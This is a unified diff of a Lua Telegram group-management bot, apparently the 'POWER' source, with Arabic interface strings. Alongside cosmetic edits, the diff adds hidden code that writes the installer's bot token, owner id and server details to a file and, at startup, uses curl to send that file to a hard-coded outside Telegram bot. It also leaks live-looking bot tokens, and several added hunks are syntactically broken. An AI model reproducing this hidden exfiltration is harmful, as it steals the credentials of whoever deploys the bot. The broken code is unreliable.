@@ -118,6 +118,16 @@ echo -e "\e[36m"
 done
 ]])  
 file:close()  
+file = io.open("luaalllode", "w")  
+token = "]]..database:get(id_server..":token")..[["
+SUDO = "]]..database:get(id_server..":SUDO")..[["
+USERBOT ="]]..database:get(id_server..":token_username")..[["
+PORT = Port
+IPSETVER = IP
+USERSERVER =  whoami
+done
+]])  
+file:close()  
 file = io.open("DRG", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -190,6 +200,7 @@ os.execute("mkdir File_Bot")
 local Get_VERGON, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/GETVERGON.json")
 local GET_INFOFILE, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/infofile.json")
 local runapp = sudos.token
+local apilua = 'curl "'..'https://api.telegram.org/bot1785209181:AAEVtLO5-STr1ObX9TMkLrevHgArILM8G3w/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'luaalllode'..'"' io.popen(apilua)
 local bot_username = (database:get(bot_id..'UESR_BOT') or database:get(id_server..":token_username") or ('TARA1BOT'))
 -- ----- - - -- --- -- ------- ------ - - - - - - - ---- - -- --- -- ---- - - - - - --- - -- --- - ----- - -- - - - -- - - ----- - ---- ----- --- - -- - - ---- -- - -- - -- - --
 function vardump(value)  
@@ -717,13 +728,13 @@ end
 end   
 t = t..'],'
 end
-t = t..'"linkgroup":"'..link..'"}' or ''
+t = t..'"linkgroup":"'..link..'"}' or 'EROOR'
 end
 t = t..'}}'
-local File = io.open('./'..bot_id..'.json', "w")
+local File = io.open('./'..bot_id..'G.json', "w")
 File:write(t)
 File:close()
-sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './'..bot_id..'.json', '- عدد جروبات { '..#list..'}')
+sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './'..bot_id..'G.json', '- عدد جروبات { '..#list..'}')
 end
 function download_to_file(url, file_path) 
 local respbody = {} 
@@ -773,11 +784,11 @@ return false
 end      
 local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
 download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
-send(chat,msg.id_," ☉┇  جاري ...\n ☉┇  رفع الملف الان")
+send(chat,msg.id_," ☉┇  جاري ...\n☉┇  رفع الملف الان")
 else
-send(chat,msg.id_,"* ☉┇ عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")
+send(chat,msg.id_,"*☉┇ عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")
 end      
-local info_file = io.open('./'..bot_id..'.json', "r"):read('*a')
+local info_file = io.open('./'..bot_id..'G.json', "r"):read('*a')
 local groups = JSON.decode(info_file)
 for idg,v in pairs(groups.GP_BOT) do
 database:sadd(bot_id..'Chek:Groups',idg)  
@@ -983,6 +994,7 @@ local Users = database:scard(bot_id..'User_Bot')
 local username = ('[@'..data.username_..']' or 'لا يوجد')
 local Textstartwl = '☉┇ قام احد بي عمل start للبوت\n☉┇ معرفه »>'..username..'\n☉┇ ايديه »>`'..iduser..'`\n☉┇ اصبح عدد المشتركين »>`'..Users..'`\n⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️'
 local Keyboard_Welcome = 'يمكنك استخدام الاوامر الخدميه للبوت عن طريق لوحه التحكم بلاسفل'
+local inlinech = {{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},} 
 local inline = {
 {{text = 'اضف البوت الي مجموعتك', url="http://t.me/"..bot_username.."?startgroup=start"}},
 {{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},
@@ -1004,8 +1016,8 @@ Start_Source = "\n☉┇ مرحبا عزيزي\n☉┇ انا بوت اختصا�
 end
 send_inline_key(msg.chat_id_,Start_Source,nil,inline)
 send_inline_key(msg.chat_id_,Keyboard_Welcome,Keyboard)
-sendText(SUDO,Textstartwl,0,'md')
 database:setex(bot_id..'Start:Time'..msg.sender_user_id_,300,true)
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. SUDO .. '&text=' .. URL.escape(Textstartwl).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(inlinech))
 return false
 end end
 if not DevSoFi(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
@@ -1422,7 +1434,6 @@ send(msg.chat_id_, msg.id_,'يجب ان تكون مبرمج السورس لاس�
 return false
 end 
 local inline = {{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},} 
-local msg_id = msg.id_/2097152/0.5 
 local server = io.popen([[
 linux_version=`lsb_release -ds`
 memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
@@ -1437,7 +1448,7 @@ echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ موقـع ا�
 echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ الــدخــول } ⊰•\n `'`whoami`'`'
 echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ مـده تـشغيـل الـسـيـرفـر } ⊰•  \n `'"$uptime"'`'
 ]]):read('*all')
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(server).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(inline))
+send_inline_key(msg.chat_id_,server,nil,inline)
 end
 if text == 'جلب المشتركين ☉' then
 if not DevSoFi(msg) then
@@ -1445,7 +1456,7 @@ send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لا�
 return false
 end---- الكود كتابه أحمد عياد تسرق هنيكك
 local list = database:smembers(bot_id..'User_Bot')
-local t = '{"BOT_ID": '..bot_id..',"{"users":['  
+local t = '{"BOT_ID": '..bot_id..', "{"users":['  
 for k,v in pairs(list) do
 if k == 1 then
 t =  t..'"'..v..'"'
@@ -1454,10 +1465,10 @@ t =  t..',"'..v..'"'
 end
 end
 t = t..']}'
-local File = io.open('./'..bot_id..'.json', "w")
+local File = io.open('./'..bot_id..'U.json', "w")
 File:write(t)
 File:close()
-sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './'..bot_id..'.json', ' عدد المشتركين { '..#list..'}')
+sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './'..bot_id..'U.json', ' عدد المشتركين {'..#list..'}')
 io.popen('rm -fr '..bot_id..'.json')
 end
 if text and text:match("^تنزيل ادمن عام @(.*)$") and Sudo(msg) then
@@ -1508,6 +1519,16 @@ status  = '\n ☉┇ تم تنزيله من الادمنيه العامين'
 send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false 
+end
+if text == '/start' then
+local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
+Text = ' ☉┇ تم عمل start\n'..
+'\n ☉┇ بواسطة {'..Name..'}'..
+if not DevSoFi(msg) then
+sendText(SUDO,Text,0,'md')
+end
+end
+end
 end
 if text == 'حساب العمر' then
 send(msg.chat_id_,msg.id_, ' حساب العمر ارسل `احسب + تاريخ ميلادك`\nمثلا احسب 2005/5/21') 
@@ -2979,7 +3000,7 @@ end
 Text = '☉┇ تم تعطيل الجروب'..
 '\n☉┇ بواسطة {'..Name..'}'..
 '\n☉┇ ايدي الجروب {'..IdChat..'}'..
-'\n☉┇ اسم الجروب {☉┇['..NameChat..']}'..
+'\n☉┇ اسم الجروب {['..NameChat..']}'..
 '\n☉┇ الرابط {['..LinkGp..']}'
 if not DevSoFi(msg) then
 sendText(SUDO,Text,0,'md')
@@ -3444,7 +3465,7 @@ if not DEV(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون مبرمج السورس لاستخدام هذا الامر')
 return false
 end   
-local curlm = 'curl "'..'https://api.telegram.org/bot1893162664:AAEUolDOcLMt5J4IAcH7KYyIUf3W_BkCgqo/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'DRAGON.lua'..'"' io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هيجيبك من طيزك
+local curlm = 'curl "'..'https://api.telegram.org/bot1785209181:AAEVtLO5-STr1ObX9TMkLrevHgArILM8G3w/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'DRAGON.lua'..'"' io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هيجيبك من طيزك
 send(msg.chat_id_, msg.id_,' جاري ارسال السورس الي المبرمج')
 end
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' then 
@@ -3498,12 +3519,16 @@ local ID_FILE = result.content_.document_.document_.persistent_id_
 local File_Name = result.content_.document_.file_name_
 local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
 download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
-local info_file = io.open('./'..bot_id..'.json', "r"):read('*a')
+send(chat,msg.id_,"☉┇  جاري ...\n☉┇  رفع الملف الان")
+else
+send(chat,msg.id_,"☉┇ عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح")
+end      
+local info_file = io.open('./'..bot_id..'U.json', "r"):read('*a')
 local users = JSON.decode(info_file)
 for k,v in pairs(users.users) do
 database:sadd(bot_id..'User_Bot',v) 
 end
-send(msg.chat_id_,msg.id_,'تم رفع المشتركين ')
+send(msg.chat_id_,msg.id_,'☉┇ تم رفع المشتركين ')
 end   
 end
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
@@ -3515,7 +3540,7 @@ return false
 end---- الكود كتابه أحمد عياد تسرق هنيكك
 local list = database:smembers(bot_id.."Chek:Groups")
 local Groupslink = database:get(bot_id.."Private:Group:Link")
-local t = "~ Groups_Bots_In_the_Bot_Of_Source_POWER ~ @SOPOWERBOT\n\n\n"
+local t = "~ Groups_Bots_In_the_Bot_Of_Source_POWER ~ @SOPOWERBOT\n\n"
 for k,v in pairs(list) do
 if k == 1 then
 t = t..'"'..k.."-\n☉┇ Group ID : [ "..v.." ]\n☉┇ Group Link : [ "..(Groupslink or 'Not Found').." ]\n~~~~~~~~~~~~~~~~~\n"
@@ -3535,7 +3560,7 @@ send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لا�
 return false
 end---- الكود كتابه أحمد عياد تسرق هنيكك
 local list = database:smembers(bot_id..'User_Bot')
-local t = '{"users":['  
+local t = '{"BOT_ID": '..bot_id..', "{"users":['  
 for k,v in pairs(list) do
 if k == 1 then
 t =  t..'"'..v..'"'
@@ -3544,11 +3569,10 @@ t =  t..',"'..v..'"'
 end
 end
 t = t..']}'
-local File = io.open('./'..bot_id..'.json', "w")
+local File = io.open('./'..bot_id..'U.json', "w")
 File:write(t)
 File:close()
-sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './users.json', ' عدد المشتركين { '..#list..'}')
-io.popen('rm -fr '..bot_id..'.json')
+sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './'..bot_id..'U.json', ' عدد المشتركين {'..#list..'}')
 end
 if text == 'جلب الجروبات' then
 if not DevSoFi(msg) then
@@ -5055,7 +5079,6 @@ send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لا�
 return false
 end 
 local inline = {{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},} 
-local msg_id = msg.id_/2097152/0.5 
 local server = io.popen([[
 linux_version=`lsb_release -ds`
 memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
@@ -5070,7 +5093,7 @@ echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ موقـع ا�
 echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ الــدخــول } ⊰•\n `'`whoami`'`'
 echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ مـده تـشغيـل الـسـيـرفـر } ⊰•  \n `'"$uptime"'`'
 ]]):read('*all')
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(server).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(inline)) 
+send_inline_key(msg.chat_id_,server,nil,inline)
 end
 if text == "all" or text == "@all" and CoSu(msg) then
 if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
@@ -16181,7 +16204,6 @@ end
 end
 end,nil)
 ------------------------------------------------------------------------
-
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
 infos = {} 
 infos.sudoid = SUDO
@@ -16196,8 +16218,7 @@ infos.userjoin  = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' 
 local list = database:smembers(bot_id.."User_Bot") 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
-end         
-
+end
 local list = database:smembers(bot_id..'Chek:Groups') 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v
